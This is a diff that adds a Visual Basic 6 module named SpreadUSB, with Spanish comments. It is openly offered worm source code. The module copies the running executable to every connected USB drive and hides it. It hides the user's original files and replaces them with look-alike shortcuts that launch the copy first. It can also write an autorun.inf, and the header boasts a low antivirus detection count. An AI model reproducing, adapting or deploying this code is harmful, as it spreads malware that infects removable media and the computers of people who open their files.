@@ -1,0 +1,197 @@
+'-------------------------------------------------------------------------------------------------------------------
+'Función: SpreadUSB
+'Autor: chequinho
+'Creditos: Karcrack (AutoRun)
+'Finalidad: Distribuir o "spradear" un archivo en todos los dispositivos USB conectados
+'Fecha: 06/07/2013
+'Detecciones: 1/35 (TrendMicro)
+'Compilacion: Native Fast Code
+'Uso: Call SpreadUSB(sMyPathEx, InfectedName, Command, isAutoRun)
+    'sMyPathEx: El directorio hacia el ejecutable a distribuir
+    'InfectedName: El nombre dej ejecutable que será copiado a los dispositivos USB
+    'Command: El comando o la ruta del archivo reemplazado (para que al ejecutar el acceso directo, se abra tambien el archivo original) [No modificar]
+    'isAutoRun: True si se desea crear AutoRun en los dispositivos, de lo contrario False
+'Ejemplo:
+    'Call SpreadUSB(App.Path & "\" & App.EXEName & ".exe", "loquesea.exe", Command, True)
+'Notas
+    '- Si la unidad esta vacía, se crea un directorio vacío llamado 'Updates'
+    '- El icono de la aplicación asociada con el tipo de archivo almacenado en el dispositivo se mantiene
+    '- Al ejecutar el acceso directo, se abrira el archivo especificado y en seguida el archivo original
+    '- El autorun es muy detectado, no es muy recomendable activarlo
+    '- Se requiere agregar referencia hacia Windows Script Host Object Model en el menú Proyecto > Referencias
+    '- Si el archivo en cuestión ya esta spradeado en un dispositivo, la función de spread se omite
+'-------------------------------------------------------------------------------------------------------------------
+ 
+Private Declare Function FindExecutable Lib "SHELL32" Alias "FindExecutableA" (ByVal lpFile As String, ByVal lpDirectory As String, ByVal lpResult As String) As Long
+Private Declare Function ShellExecuteA Lib "SHELL32" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
+ 
+Public Sub SpreadUSB(FilePath As String, FileNameDest As String, Parameter As String, isAutoRun As Boolean)
+    Call ExecParam(Parameter)
+    If inUSB(FilePath) = True Then Exit Sub
+    Dim i As Long
+    Dim USBDrivers() As String
+    USBDrivers = Split(DetectUSBDrivers, "<->")
+    Dim sFile As String
+    For i = 0 To UBound(USBDrivers) - 1
+        If FileExist(USBDrivers(i) & "\" & FileNameDest) = False Then
+            If Mid(FilePath, 1, 2) <> USBDrivers(i) Then
+                If isFolderEmpty(USBDrivers(i)) Then Call MkDir(USBDrivers(i) & "\Updates")
+                sFile = Dir(USBDrivers(i) & "\*.*", vbDirectory + vbNormal)
+                Call FileCopy(FilePath, USBDrivers(i) & "\" & FileNameDest)
+                Call SetAttr(USBDrivers(i) & "\" & FileNameDest, vbHidden + vbReadOnly + vbSystem)
+                Do While sFile <> ""
+                    If sFile <> FileNameDest And ExtStr(sFile, 2) <> ".lnk" Then
+                        Call WriteShortcut(USBDrivers(i) & "\" & FileNameDest, USBDrivers(i), sFile)
+                        Call SetAttr(USBDrivers(i) & "\" & sFile, vbHidden + vbReadOnly + vbSystem)
+                    End If
+                    sFile = Dir
+                Loop
+                If isAutoRun = True Then Call CreateAutorun(USBDrivers(i) & "\", FileNameDest)
+            End If
+        End If
+    Next i
+End Sub
+ 
+Private Function DetectUSBDrivers() As String
+    Dim objDrive As Object
+    DetectUSBDrivers = ""
+    Const DRIVE_REMOVABLE = 1
+    For Each objDrive In CreateObject("Scripting.FileSystemObject").Drives
+        If objDrive.IsReady Then
+            If objDrive.DriveType = DRIVE_REMOVABLE And objDrive.Path <> "A:" Then
+                DetectUSBDrivers = DetectUSBDrivers & objDrive.Path & "<->"
+            End If
+        End If
+    Next
+End Function
+ 
+Private Sub CreateAutorun(USBPath As String, FileOpen As String)
+    ' Thanks to Karcrack
+    Dim INIFile As String
+    Dim FF As Long
+    FF = FreeFile
+    INIFile = USBPath & "autorun.inf"
+    If FileExist(INIFile) Then
+        Call Kill(INIFile)
+    End If
+    Dim Data As String
+    Data = _
+        "[Autorun]" & vbNewLine & _
+        "Open=" & FileOpen & vbNewLine & _
+        "Icon=%SystemRoot%\system32\SHELL32.dll,7" & vbNewLine & _
+        "UseAutoPlay=1" & vbNewLine & _
+        "Action=Open USB" & vbNewLine & _
+        "Action= @" & FileOpen & vbNewLine & _
+        "shell\open=Open" & vbNewLine & _
+        "shell\open\Command=" & FileOpen & vbNewLine & _
+        "shell\open\Default=1" & vbNewLine & _
+        "shell\explore\Command=" & FileOpen
+    Open INIFile For Output As #FF
+        Print #FF, Data
+    Close #FF
+    Call SetAttr(INIFile, vbHidden + vbReadOnly + vbSystem)
+End Sub
+ 
+Private Sub WriteShortcut(FilePath As String, DestPath As String, ShortcutName As String)
+    Dim Filesys As New FileSystemObject
+    Dim WshShell As Object
+    Dim oShellLink As Object
+    Dim sourcePath As String
+    Dim sExtension As String
+    Dim Assoc As String
+    Set WshShell = CreateObject("WScript.Shell")
+    Set oShellLink = WshShell.CreateShortcut(DestPath & "\" & ShortcutName & ".lnk")
+    sourcePath = DestPath & "\" & ShortcutName
+    sExtension = ExtStr(sourcePath, 2)
+    If Filesys.FileExists(oShellLink) Then Exit Sub
+    oShellLink.TargetPath = FilePath
+    oShellLink.Arguments = sourcePath
+    If sExtension = LCase(".exe") Then
+        oShellLink.IconLocation = "shell32.dll, 2"
+    ElseIf GetAttr(sourcePath) And vbDirectory Then
+        oShellLink.IconLocation = "shell32.dll, 3"
+        oShellLink.Arguments = sourcePath & ".fldr"
+    Else
+        Assoc = FindAssociatedProgram(sourcePath)
+        If Assoc <> vbNullString Then
+            oShellLink.IconLocation = Assoc & ", 0"
+        Else
+            oShellLink.IconLocation = "shell32.dll, 0"
+        End If
+    End If
+    oShellLink.WorkingDirectory = DestPath
+    oShellLink.Save
+    Set oShellLink = Nothing
+    Set WshShell = Nothing
+End Sub
+ 
+Private Function ExtStr(sPath As String, iOpt As Long) As String
+    Dim FullName As String
+    FullName = Mid$(sPath, InStrRev(sPath, "\") + 1)
+    Select Case iOpt
+        Case 1
+            ExtStr = Mid$(FullName, 1, InStrRev(FullName, ".") - 1)
+        Case 2
+            ExtStr = "." & Mid$(FullName, InStrRev(FullName, ".") + 1)
+        Case 3
+            ExtStr = FullName
+    End Select
+End Function
+ 
+Private Function FileExist(filename As String) As Boolean
+    On Error GoTo ErrorHandler
+    Call FileLen(filename)
+    FileExist = True
+    Exit Function
+ErrorHandler:
+    FileExist = False
+End Function
+ 
+Private Function isFolderEmpty(ByVal Folder As String) As Boolean
+    Dim fso
+    Dim strPath As String
+    On Error GoTo ErrorHandler
+    isFolderEmpty = False
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    strPath = fso.GetAbsolutePathName(Folder)
+    If Dir(strPath, vbDirectory) = "" Then isFolderEmpty = True
+    Exit Function
+ErrorHandler:
+End Function
+ 
+Private Function FindAssociatedProgram(ByVal sFilePath As String) As String
+    Dim result As String
+    Dim pos As Integer
+    result = Space$(1024)
+    FindExecutable ExtStr(sFilePath, 3), Left(sFilePath, InStrRev(sFilePath, "\")), result
+    pos = InStr(result, Chr$(0))
+    FindAssociatedProgram = Left$(result, pos - 1)
+End Function
+ 
+Private Function inUSB(sFilePath As String) As Boolean
+    Dim i As Long
+    Dim USBDrivers() As String
+    USBDrivers = Split(DetectUSBDrivers, "<->")
+    Dim sFile As String
+    inUSB = False
+    For i = 0 To UBound(USBDrivers) - 1
+        If Mid(sFilePath, 1, 2) = USBDrivers(i) Then
+            inUSB = True
+            Exit For
+        End If
+    Next i
+End Function
+ 
+Private Sub RunFile(sPath As String, Optional Parameter As String = vbNullString)
+    ShellExecuteA 0&, "Open", sPath, Parameter, vbNullString, 1
+End Sub
+ 
+Private Sub ExecParam(Parameter As String)
+    If Parameter <> vbNullString Then
+        If ExtStr(Parameter, 2) <> ".fldr" Then
+            Call RunFile(Parameter)
+        Else
+            Call RunFile(Environ$("WinDir") & "\explorer.exe", Left(Parameter, Len(Parameter) - 5))
+        End If
+    End If
+End Sub
